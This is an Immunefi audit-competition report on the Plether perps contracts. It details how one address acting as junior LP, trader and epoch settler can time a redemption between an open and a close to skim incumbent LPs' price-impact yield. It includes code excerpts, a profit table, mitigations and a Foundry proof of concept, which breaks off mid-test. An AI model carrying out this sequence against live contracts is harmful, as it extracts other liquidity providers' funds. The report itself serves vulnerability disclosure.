# \#98031 [SC-Critical] Open-side price-impact revenue is priced into the payer's own same-epoch LP redemption and then reclaimed as a close rebate, letting a dual-role LP and trader skim incumbent LP yield

**Submitted on Nov 4th 2026 at 13:57:40 UTC by @abarbatei for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98031
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

When a trader opens a position that increases pool skew, the engine charges a positive price-impact amount (VPI) and books it immediately as realized liquidity-provider revenue: pool `totalAssets` rises by exactly that amount, and the next reconcile routes it into tranche principal. The same position keeps the right to reclaim up to that whole amount as a close-time rebate paid from pool free cash. Nothing links a trader's position to that trader's own liquidity-provider shares. An ordinary address that is simultaneously a large junior liquidity provider, a trader, and a permissionless epoch settler can therefore open to inflate junior principal, settle so its own matured redemption is priced at the inflated principal, redeem to keep a share of its own still-reversible payment, and then close to reclaim the full payment as a rebate charged to the liquidity providers who stayed. In production this is a repeatable extraction of incumbent liquidity providers' booked, unwithdrawn trading-revenue yield by an untrusted actor.

## Vulnerability Details

Normal intended behavior. A skew-increasing open pays a price-impact charge that compensates liquidity providers for taking on risk, and a quick open-and-close round trip is meant to net to approximately zero for the trader: the open-side charge is given back at close through a one-sided clamp that stops a trader from extracting more than it paid. Liquidity-provider epochs settle on a one-hour cadence, and a matured redemption is funded at the tranche principal that stands at settlement. Shared profit and loss and transient net-asset-value movement are expected and documented; what is not intended is for one untrusted actor to keep part of a charge it is about to have refunded, at the direct expense of the other liquidity providers.

Root cause. Open-side positive price impact is recognized as realized, reversible liquidity-provider revenue at the moment of the open, so it enters the principal that prices a same-epoch redemption before the payer gives that same amount back at close. The booking happens in the [`CfdEngineSettlementSidecar::executeOpen` lines 454-464](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L464) function:

```solidity
        if (delta.tradeCostAssets > 0) {
            uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
            if (poolCashInflowAssets > 0) {
                IHousePool(host.pool())
                    .recordClaimantInflow(
                        poolCashInflowAssets,
                        IHousePool.ClaimantInflowKind.Revenue,
                        IHousePool.ClaimantInflowCashMode.CashArrived
                    );
            }
        }
```

For a positive-impact open the pool-cash inflow equals the charge `V` (the execution fee has already gone to the treasury). Recording it as `CashArrived` revenue raises accounted assets at once, inside the [`HousePool::recordClaimantInflow` lines 640-642](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L640-L642) function:

```solidity
        if (cashMode == IHousePool.ClaimantInflowCashMode.CashArrived) {
            accountedAssets += amount;
        }
```

So `pool.totalAssets()` rises by exactly `V` from the instant of the open, and no reserve is withheld for a positive-accrual position.

Same-epoch pricing. Settlement reconciles the pool, which routes the newly arrived revenue into principal, and only then reads the principal that prices redemptions. The ordering is fixed in the [`HousePool::_settleLpEpoch` lines 835-841](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841) function:

```solidity
        _reconcile(accountingSnapshot, statusSnapshot);
        _checkpointEngineCarryIndexes();

        result.cutoffEpoch = cutoffEpoch;
        RedemptionPhase memory juniorPhase;
        juniorPhase.pricingPrincipal = juniorPrincipal;
        juniorPhase.pricingSupply = _juniorShareSupply();
```

Reconcile moves the distributable excess through the revenue waterfall. With the senior tranche at its high-water mark the whole amount lands in junior principal, in the [`HousePoolWaterfallAccountingLib::distributeRevenue` lines 147-158](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L147-L158) function:

```solidity
        if (remaining > 0 && nextState.seniorPrincipal < nextState.seniorHighWaterMark) {
            uint256 deficit = nextState.seniorHighWaterMark - nextState.seniorPrincipal;
            uint256 restore = remaining < deficit ? remaining : deficit;
            nextState.seniorPrincipal += restore;
            remaining -= restore;
        }

        if (nextState.seniorPrincipal > nextState.seniorHighWaterMark) {
            nextState.seniorHighWaterMark = nextState.seniorPrincipal;
        }

        nextState.juniorPrincipal += remaining;
```

That revenue routing is reached from reconcile through the [`HousePoolReconcilePlanLib::planReconcile` lines 95-99](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L95-L99) function:

```solidity
        if (plan.revenue) {
            plan.juniorPrincipalBeforeRevenue = plan.state.waterfall.juniorPrincipal;
            plan.state.waterfall =
                HousePoolWaterfallAccountingLib.distributeRevenue(plan.state.waterfall, plan.deltaAssets);
            return plan;
        }
```

The matured junior redemption is then funded at that post-reconcile principal, at zero settlement fee in the live (non-frozen) regime, in the [`HousePool::_settleLpEpoch` lines 881-888](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L881-L888) function:

```solidity
            juniorPhase.budget = _juniorSettlementCapacity(freeAssets, _getWaterfallState());
            juniorPhase = _fundRedemptionPhase(
                juniorVault, result.cutoffEpoch, juniorPhase, _settlementFeeBps(false, statusSnapshot.oracleFrozen)
            );
            if (juniorPhase.fundedAssets > 0) {
                juniorPrincipal -= juniorPhase.fundedAssets;
                accountedAssets -= juniorPhase.fundedAssets;
            }
```

A request placed in epoch E matures for epoch E+1, and any settlement during E+1 funds it. The settlement entrypoint is permissionless, so the actor can trigger it itself through the [`OrderRouter::settleLpEpoch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L479-L484) function:

```solidity
    function settleLpEpoch(
        bytes[] calldata pythUpdateData
    ) external payable nonReentrant {
        pythUpdateData;
        _delegateToKeeperSidecar();
    }
```

Because the actor holds fraction `a` of the junior tranche, its redemption captures `a * V` of its own still-reversible payment, and the other `(1 - a) * V` stays credited to the liquidity providers who remain.

Reclaim at close. A skew-reducing close computes a fresh negative price impact at the post-redemption depth and clamps it so lifetime price impact cannot go below zero, that is, the rebate cannot exceed the accrual `V`. The clamp is applied in the [`CloseAccountingLib::buildCloseState` lines 103-118](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118) function:

```solidity
        state.proportionalAccrualAssets =
            (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
        // With no economic depth, keep protective exits live without creating a fresh charge or rebate.
        // The lifetime clamp below still recovers any previously received negative VPI.
        if (inputs.poolDepthAssets != 0) {
            state.vpiDeltaAssets = CfdMath.calculateVPI(
                inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
            );
        }
        // Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
        // where an attacker opens at high depth, reduces pool depth, then closes to extract a
        // net-negative lifetime VPI rebate. This rule is identical in live and oracle-frozen markets; frozen-market
        // stale-price risk is priced separately through frozenSpreadAssets.
        if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
            state.vpiDeltaAssets = -state.proportionalAccrualAssets;
        }
```

A negative net action produces a rebate equal to the price impact less the close fee and carry, in the [`CfdEnginePlanLib::_planCloseActionSettlement` lines 1041-1061](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1041-L1061) function:

```solidity
        int256 actionNetAssets = cs.vpiDeltaAssets
            + int256(
                cs.executionFeeAssets + cs.frozenSpreadAssets + delta.pendingCarryAssets - delta.realizedCarryAssets
            );
        uint256 vpiClawbackWithheldAssets;
        if (actionNetAssets > 0) {
            delta.actionChargeAssessedAssets = uint256(actionNetAssets);
            delta.actionChargeWithheldAssets = delta.priceGainAssets < delta.actionChargeAssessedAssets
                ? delta.priceGainAssets
                : delta.actionChargeAssessedAssets;
            delta.actionChargeToCollectAssets = delta.actionChargeAssessedAssets - delta.actionChargeWithheldAssets;
            uint256 vpiClawbackAssets =
                _negativeVpiReserveTarget(snap.position.vpiAccrued) - delta.vpiRebateReserveAfterAssets;
            vpiClawbackWithheldAssets = delta.actionChargeWithheldAssets < vpiClawbackAssets
                ? delta.actionChargeWithheldAssets
                : vpiClawbackAssets;
            delta.vpiRebateReserveConsumedAssets = vpiClawbackAssets - vpiClawbackWithheldAssets;
            _planCloseCashSources(snap, delta, cs.remainingSize == 0);
        } else if (actionNetAssets < 0) {
            delta.actionRebateAssets = uint256(-actionNetAssets);
        }
```

The rebate is paid from pool free cash that reserves only outstanding trader claims, not liquidity-provider balances, in the [`CfdEnginePlanLib::_planIsolatedCloseSettlement` lines 970-978](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L970-L978) function:

```solidity
        freePoolCashAssets =
        CashPriorityLib.reserveFreshPayouts(poolCashAfterCollectionsAssets, claimsAfterPriceNettingAssets)
        .freeCashAssets;
        if (delta.actionRebateAssets > 0) {
            delta.actionRebatePaidAssets =
                delta.actionRebateAssets < freePoolCashAssets ? delta.actionRebateAssets : freePoolCashAssets;
            delta.actionRebateWaivedAssets = delta.actionRebateAssets - delta.actionRebatePaidAssets;
            poolCashAfterCollectionsAssets -= delta.actionRebatePaidAssets;
        }
```

The payout leaves the pool in the [`CfdEngineSettlementSidecar::_executeClose` lines 621-624](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624) function:

```solidity
        if (delta.actionRebatePaidAssets > 0) {
            IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
            clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
        }
```

Because the actor's own shares have already left the pool at the redemption, the rebate outflow is borne by the junior principal that remains. Loss is taken junior-first at the next reconcile, in the [`HousePoolWaterfallAccountingLib::absorbLoss`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L167-L184) function.

Why the clamp does not stop this. The lifetime clamp is a trader-side control: it ensures a round-trip trader cannot reclaim more than it paid, so the trade itself is a loss of fees and carry. This finding never exceeds the clamp. The extraction is on the liquidity-provider leg, where there is no equivalent control: the redemption prices in the actor's own reversible payment before the close reverses it, and the one-sided clamp then lets the full payment flow back as a rebate drawn from the liquidity providers who did not time their exit.

Why this is not documented or accepted behavior. The accounting specification's collection-time ownership policy ("LP ownership follows collection time", in `packages/perps/ACCOUNTING_SPEC.md`) concerns carry, which is non-reversible once collected, and an incoming liquidity provider sharing revenue that belongs to the liquidity providers present when it accrued. The generic trade-off recorded in the project's history, that a permissionless settlement may be ordered before an unrelated later close or liquidation realizes a loss, describes a transaction-ordering race between independent parties. Neither covers this mechanism. Here the same actor creates the booked amount, holds a contractual right to reverse it through the lifetime clamp, and prices its own exit against it. No race and no third-party loss is involved, and the outcome is the same whatever order other participants' transactions take.

Attack sequence. The whole cycle uses only public entrypoints:

1. Early in liquidity-provider epoch E, the actor requests redemption of its junior shares. The request matures for epoch E+1.
2. The actor opens a skew-increasing position. The open charges the positive price impact `V`, which the pool books at once as `CashArrived` revenue, so `pool.totalAssets()` rises by `V`.
3. After the epoch boundary, the actor calls the permissionless settlement entrypoint. Reconcile routes `V` into junior principal, and the matured redemption is then funded at that inflated principal, returning `a * V` of the actor's own payment to the actor.
4. The actor claims the funded redemption, then closes the position skew-reducing. The lifetime clamp allows a rebate of up to `V`, paid from pool free cash. The actor's shares have already left, so the liquidity providers who remain bear the outflow.

Attacker role and preconditions. The actor is an ordinary address holding no privileged role. It needs a large junior share so that `a * V` exceeds the two execution fees and carry, pre-existing directional skew from third-party trading so a modest increment pays a price impact well above those fees, junior covenant and free-cash headroom at settlement, and a live, unpaused, fresh-mark regime. Live execution also applies the oracle's adverse-confidence price shift, which the proof does not model; at the release parameters it is at most 2.5 basis points of notional per leg, about 25 USDG per round trip at the proof's size, so the cycle stays profitable. No trusted-role action, parameter change, pause, or price manipulation is required. Liquidity-provider epoch settlement is explicitly a permissionless keeper action under the program rules.

## Impact Details

A single untrusted actor extracts booked but unwithdrawn trading-revenue yield from the liquidity providers who remain in the junior tranche, and nets a positive profit, by timing a redemption between an open and its close. The captured value is the `a * V` portion of the actor's own price-impact payment that the redemption returns to it, which the remaining liquidity providers would otherwise have kept.

Measured at the release parameters, on a ten-million-USDG pool split six million senior and four million junior, with the actor holding about half of the junior tranche on top of a three-million-USDG third-party directional skew:

| Quantity | Value per cycle |
| :-- | :-- |
| Open-side price impact booked as revenue (`V`) | 1,624 USDG |
| Redemption excess captured by the actor (`a * V`) | 811 USDG |
| Close rebate paid from pool free cash | 1,423 USDG |
| Attacker net profit | +410 USDG |
| Incumbent junior liquidity providers net | -611 USDG |

The incumbent loss exceeds the attacker gain by the open-side execution fee of 200 USDG, which is credited to the protocol treasury. The close-side fee and the carry are netted out of the rebate and remain in the pool. Values are rounded to whole USDG, matching the integer values the proof logs. The cycle is repeatable: a fresh redemption request can be made each epoch, subject to the one-hour epoch cadence, the deposit cooldown, and the junior covenant cap. Profit scales linearly with the actor's junior share and with the pre-existing skew, so larger stakes and higher ambient skew raise the per-cycle take.

This maps to the program impact "Theft of unclaimed yield" (High). It is not a theft of at-rest principal: in the profitable regime the incumbents' absolute balance is cushioned by ongoing third-party price-impact revenue, so the loss is of yield relative to the fair, no-timing baseline. It is more than a failure to deliver promised returns, because value leaves the incumbents and reaches a profiting actor who chose the timing.

## Mitigation

Address the root cause: do not let a liquidity-provider redemption be priced at principal that includes a price-impact amount the payer can still reverse. Any one of the following removes the extraction while preserving the documented shared profit and loss:

- Defer recognition of open-side positive price impact into tranche principal until the position that paid it is closed or its reversibility window has passed, rather than crediting it as `CashArrived` revenue at the open. Hold it in a non-net-asset-value escrow bucket (symmetric with how the negative-impact reserve is already excluded from net asset value) so that a same-epoch redemption cannot be priced against it.
- Alternatively, bound the close-time action rebate by the pool cash that remains after reserving liquidity-provider balances funded in the same or a pending epoch, not only outstanding trader claims, so a redeemer cannot be funded from principal that the close is about to withdraw.
- Alternatively, extend the lifetime clamp to the actor's combined trader and liquidity-provider position, so that value returned through a redemption priced on the open-side impact reduces the rebate available at close.

The first option is the cleanest, matching the treatment already given to the negative-impact reserve, and does not change outcomes for liquidity providers who do not redeem across a round trip.

## References

- [`CfdEngineSettlementSidecar::executeOpen` lines 454-464](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L464): books open-side positive price impact as `CashArrived` liquidity-provider revenue.
- [`HousePool::recordClaimantInflow` lines 640-642](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L640-L642): raises accounted assets at once for a `CashArrived` inflow.
- [`HousePool::_settleLpEpoch` lines 835-841](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841): reconciles, then reads the principal that prices redemptions.
- [`HousePool::_settleLpEpoch` lines 881-888](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L881-L888): funds the matured junior redemption at that principal with zero live-regime fee.
- [`HousePoolReconcilePlanLib::planReconcile` lines 95-99](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L95-L99): routes distributable revenue into the waterfall.
- [`HousePoolWaterfallAccountingLib::distributeRevenue` lines 147-158](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L147-L158): with senior at its high-water mark, sends the remainder to junior principal.
- [`HousePoolWaterfallAccountingLib::absorbLoss`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L167-L184): absorbs the rebate outflow junior-first.
- [`CloseAccountingLib::buildCloseState` lines 103-118](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118): clamps lifetime price impact so the rebate cannot exceed the accrual.
- [`CfdEnginePlanLib::_planCloseActionSettlement` lines 1041-1061](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1041-L1061): turns a negative net action into the action rebate.
- [`CfdEnginePlanLib::_planIsolatedCloseSettlement` lines 970-978](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L970-L978): pays the rebate from pool free cash that reserves only trader claims.
- [`CfdEngineSettlementSidecar::_executeClose` lines 621-624](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624): pays the rebate out of the pool.
- [`OrderRouter::settleLpEpoch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L479-L484): permissionless settlement entrypoint the actor uses to fund its own redemption.


## Proof of Concept

## Proof of Concept

The proof runs in the repository's own Foundry test suite at the commit in scope. It extends the suite's base fixture `BasePerpTest` (at `packages/perps/test/perps/BasePerpTest.sol`), which deploys the full perps stack (CfdEngine, HousePool, the Senior and Junior TrancheVaults, MarginClearinghouse, PletherOracle, OrderLifecycleBook and the OrderRouter) and mocks only the two out-of-scope components, the settlement token and Pyth, through the suite's `MockSettlementToken` and `MockPyth`. No contract in scope is modified.

The attack is end to end. Every step is a transaction sent from the attacker address to a public entrypoint of the deployed stack: `TrancheVault::requestRedeem` and `TrancheVault::claimRedeem` on the junior vault, `OrderRouter::commitOrder` with the production V3 bounded order request, `OrderRouter::executeOrder` with caller-supplied Pyth data (the attacker executes its own orders as a permissionless keeper), `OrderRouter::updateMarkPrice`, and `OrderRouter::settleLpEpoch` with caller-supplied Pyth data. No call pranks a protocol contract; the only cheats are picking the sender, funding ETH for the Pyth fee, and time warps. The suite's helpers are used only to fund the pool and the traders before the attack and to configure the out-of-scope Pyth mock. A single test demonstrates the impact; the counterfactual that isolates the capture is folded into that test arithmetically, by repricing the identical funded shares at the identical post-reconcile principal minus the actor's own `V`.

Setup assumptions:

- Toolchain: Foundry with Solidity 0.8.35 and via-IR, as pinned by the perps package `foundry.toml` (optimizer 200 runs).
- Place the proof under a fresh directory inside the perps package test tree, `packages/perps/test/poc/vpi-epoch-redemption-timing/ProofVpiEpochRedemptionTiming.t.sol`. The `../../perps/BasePerpTest.sol` import resolves the base fixture from that location, and the `@plether/perps/` imports resolve through the package's own remappings (`@plether/perps/=src/`). No build fix to the target was needed; the package compiles the proof and its dependencies unchanged.
- Risk parameters are set to the DEPLOYMENT.md release values through the fixture's `_riskParams` override (vpiFactor 0.01, maxSkewRatio 0.4, maintMarginBps 10, initMarginBps 20, fadMarginBps 300, baseCarryBps 500, executionFeeBps is the suite default 4). The pool is funded to 10M USDG (6M senior, 4M junior split evenly between the actor and one incumbent), with a 3M-USDG third-party directional skew. No network or fork is used.

Exact execution command (run from `packages/perps`):

```
forge test --match-contract ProofVpiEpochRedemptionTiming -vv
```

Full proof source:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IAsyncTrancheVault} from "@plether/perps/interfaces/IAsyncTrancheVault.sol";
import {IHousePoolRedemptionMathSidecar} from "@plether/perps/interfaces/IHousePoolRedemptionMathSidecar.sol";

/**
 * End-to-end proof. One untrusted address wears three hats at once:
 *   (1) junior LP holding ~50% of the junior tranche,
 *   (2) trader of a skew-increasing position whose open-side price-impact charge V is
 *       booked at once as CashArrived LP revenue (CfdEngineSettlementSidecar.executeOpen),
 *   (3) permissionless keeper that executes its own orders and settles the LP epoch.
 *
 * Every attack step is a transaction sent by that address to a public entrypoint of the
 * deployed stack: TrancheVault.requestRedeem / claimRedeem, OrderRouter.commitOrder (the
 * production V3 bounded request), OrderRouter.executeOrder, OrderRouter.updateMarkPrice and
 * OrderRouter.settleLpEpoch (both with caller-supplied Pyth data). No call pranks a
 * protocol contract. The suite's helpers are used only to fund the pool and the traders
 * before the attack and to configure the out-of-scope Pyth mock.
 *
 * Sequence: request redemption -> open (pay V, pool books V as revenue) -> settle the
 * next epoch (reconcile prices V into junior principal BEFORE the redemption phase
 * prices the actor's request) -> claim -> close skew-reducing (rebate ~V - fee - carry
 * paid from remaining pool free cash).
 *
 * Assertions (all inside one run, plus an arithmetic control without the actor's trader legs):
 *  A. pool.totalAssets() rises by exactly V at the open (revenue booked immediately);
 *  B. the funded redemption is priced at the post-reconcile principal that includes V
 *     (its value exceeds the no-actor-V counterfactual by ~a*V);
 *  C. the close pays an action rebate ~= V - closeFee - carry from pool free cash;
 *  D. the attacker's combined USDG wealth change across both hats is positive at the
 *     release parameters (vpiFactor 0.01, maxSkewRatio 0.4, executionFeeBps 4), roughly
 *     a*V - 2*fee - carry, funded by the remaining (incumbent) junior LPs.
 */
contract ProofVpiEpochRedemptionTiming is BasePerpTest {
    address internal constant ACTOR = address(0xA11CE);
    address internal constant INCUMBENT_JUNIOR = address(0x1C1000);
    address internal constant INCUMBENT_SENIOR = address(0x5E0001);
    address internal constant SKEW_TRADER = address(0x5E30000);

    uint256 internal constant JUNIOR_EACH = 2_000_000e6; // actor + incumbent junior
    uint256 internal constant SENIOR_TOTAL = 6_000_000e6;
    uint256 internal constant PRICE = 1e8; // 1.00

    // Third-party skew trader notional 3M USDG; the actor adds 500k USDG (both LONG).
    uint256 internal constant SKEW_SIZE = 3e24; // 3e4 lots * 1e20
    uint256 internal constant ACTOR_SIZE = 5e23; // 5e3 lots * 1e20
    uint256 internal constant ACTOR_TRADER_FUNDING = 30_000e6;
    uint256 internal constant ACTOR_ORDER_MARGIN = 5_000e6;

    struct RunResult {
        uint256 vpiPaid; // V booked from the actor's open
        uint256 poolAssetsDeltaAtOpen;
        uint256 fundedShares;
        uint256 redeemedAssets; // full claim of the funded redemption
        uint256 juniorPrincipalAtPricing; // post-reconcile, pre-funding
        uint256 juniorSupplyAtPricing;
        uint256 balanceAfterOpen;
        uint256 balanceAfterClose;
        uint256 wealthBeforeAttack; // actor USDG (wallet + clearinghouse) after funding, before any attack step
        uint256 wealthEnd;
        uint256 poolAssetsBeforeClose;
        uint256 poolAssetsAfterClose;
    }

    // ------------------------------------------------------------------
    // Fixture overrides: release risk parameters, no default LPs
    // ------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18, // DEPLOYMENT.md release value
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    // ------------------------------------------------------------------
    // Public-entrypoint helpers. Each sends the call from `account`; the only
    // cheat is vm.prank to pick the sender and vm.deal for the Pyth fee.
    // ------------------------------------------------------------------

    function _request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        uint256 targetPrice,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(side, sizeDelta, marginDelta, isClose, block.timestamp)),
            side: side,
            sizeDelta: sizeDelta,
            marginDelta: marginDelta,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    /// @dev `account` commits the bounded order, then executes it itself as a permissionless keeper.
    function _commitAndExecute(
        address account,
        OrderV3Types.OrderRequest memory request
    ) internal returns (uint64 orderId) {
        vm.prank(account);
        orderId = router.commitOrder(request);
        bytes[] memory pythData = _mockPythUpdateData(PRICE); // configures the out-of-scope Pyth mock
        uint256 fee = router.pletherOracle().getUpdateFee(pythData);
        vm.prank(account);
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: fee}(orderId, pythData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _refreshMarkVia(
        address account
    ) internal {
        bytes[] memory pythData = _mockPythUpdateData(PRICE);
        uint256 fee = router.pletherOracle().getUpdateFee(pythData);
        vm.prank(account);
        router.updateMarkPrice{value: fee}(pythData);
    }

    function _settleLpEpochVia(
        address account
    ) internal {
        bytes[] memory pythData = _mockPythUpdateData(PRICE);
        uint256 fee = router.pletherOracle().getUpdateFee(pythData);
        vm.prank(account);
        router.settleLpEpoch{value: fee}(pythData);
    }

    function _wealth(
        address account
    ) internal view returns (uint256) {
        return settlementToken.balanceOf(account) + clearinghouse.balanceAssets(account);
    }

    // ------------------------------------------------------------------
    // Scenario
    // ------------------------------------------------------------------

    function _runScenario() internal returns (RunResult memory r) {
        // 1. Pre-attack state: fund the pool and the traders (suite helpers), ETH for Pyth fees.
        _fundJunior(INCUMBENT_JUNIOR, JUNIOR_EACH);
        _fundJunior(ACTOR, JUNIOR_EACH);
        _fundSenior(INCUMBENT_SENIOR, SENIOR_TOTAL);
        _setSeniorCapacity(type(uint256).max - 1, 8000); // release maxSeniorShareBps
        _fundTrader(SKEW_TRADER, 30_000e6);
        _fundTrader(ACTOR, ACTOR_TRADER_FUNDING);
        vm.deal(ACTOR, 1 ether);
        vm.deal(SKEW_TRADER, 1 ether);
        r.wealthBeforeAttack = _wealth(ACTOR);

        // 2. Fresh epoch E; the actor refreshes the mark through the router and places its
        //    redemption request (matures for epoch E+1). Absolute warps only: via-IR caches
        //    block.timestamp within one call.
        uint256 epochE = engine.lastMarkTime() / 1 hours + 2;
        uint256 t0 = pool.lpEpochStart(epochE) + 120;
        vm.warp(t0);
        _refreshMarkVia(ACTOR);
        uint256 actorShares = juniorVault.balanceOf(ACTOR);
        vm.prank(ACTOR);
        uint256 redeemId = IAsyncTrancheVault(address(juniorVault)).requestRedeem(actorShares, ACTOR, ACTOR);

        // 3. Third-party trader opens the baseline skew through the router.
        vm.warp(t0 + 60);
        _commitAndExecute(SKEW_TRADER, _request(CfdTypes.Side.LONG, SKEW_SIZE, 20_000e6, 1, false));

        // 4. Actor opens skew-increasing through the router; the VPI charge V is booked at
        //    once as CashArrived revenue (physical pool assets rise by exactly V).
        vm.warp(t0 + 120);
        uint256 poolAssetsBeforeOpen = pool.totalAssets();
        _commitAndExecute(ACTOR, _request(CfdTypes.Side.LONG, ACTOR_SIZE, ACTOR_ORDER_MARGIN, 1, false));
        (,,,,,, int256 vpiAccrued) = engine.positions(ACTOR);
        r.vpiPaid = uint256(vpiAccrued);
        r.poolAssetsDeltaAtOpen = pool.totalAssets() - poolAssetsBeforeOpen;
        r.balanceAfterOpen = clearinghouse.balanceAssets(ACTOR);

        // 5. Next epoch: the actor settles through the permissionless router entrypoint.
        //    _reconcile books the queued revenue into junior principal BEFORE the redemption
        //    phase prices the request.
        uint256 t1 = pool.lpEpochStart(epochE + 1) + 120;
        vm.warp(t1);
        _settleLpEpochVia(ACTOR);

        // 6. Actor claims whatever was funded.
        r.fundedShares = IAsyncTrancheVault(address(juniorVault)).claimableRedeemRequest(redeemId, ACTOR);
        assertGt(r.fundedShares, 0, "actor redemption must be funded in the target epoch");
        vm.prank(ACTOR);
        r.redeemedAssets =
            IAsyncTrancheVault(address(juniorVault)).claimRedeem(redeemId, r.fundedShares, ACTOR, ACTOR);
        // Post-settle junior principal; the pricing principal (post-reconcile,
        // pre-funding) is this plus the assets the funding phase escrowed out.
        r.juniorPrincipalAtPricing = pool.juniorPrincipal() + r.redeemedAssets;
        r.juniorSupplyAtPricing = juniorVault.totalSupply() + r.fundedShares;

